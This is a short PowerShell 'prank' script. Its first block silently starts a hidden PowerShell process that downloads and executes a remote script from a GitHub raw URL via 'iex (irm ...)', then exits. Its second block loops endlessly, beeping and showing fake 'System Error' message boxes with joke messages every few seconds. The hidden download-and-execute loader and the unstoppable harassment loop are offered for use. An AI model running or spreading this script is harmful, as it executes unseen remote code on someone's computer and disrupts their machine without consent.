# --- BACKGROUND PERSISTENCE LOGIC ---
# If this is the main window, launch a hidden background process and exit.
if ($null -eq $env:IS_BACKGROUND) {
    $command = "iex (irm https://raw.githubusercontent.com/rozeen-shrestha/prank/refs/heads/main/roz.ps1)"
    Start-Process powershell -ArgumentList "-WindowStyle Hidden -NoProfile -Command `"$command`"" -WindowStyle Hidden
    $env:IS_BACKGROUND = 1
    exit
}

# --- PRANK LOGIC (This runs in the hidden background process) ---
$errorMessages = @(
    "Critical Error: Keyboard requires cleaning. Cookie crumbs detected.",
    "System Error: Monitor detects poor posture. Spinal recalibration recommended.",
    "Error: Mouse movement detected but no actual work being done.",
    "Warning: Your desk chair has detected extended sitting periods. Please stand up.",
    "Error: 404 Motivation not found."
)

Add-Type -AssemblyName PresentationFramework

while ($true) {
    [System.Console]::Beep(500, 300)
    $msg = $errorMessages | Get-Random
    [System.Windows.MessageBox]::Show($msg, "System Error", "OK", "Error")
    Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 4)
}
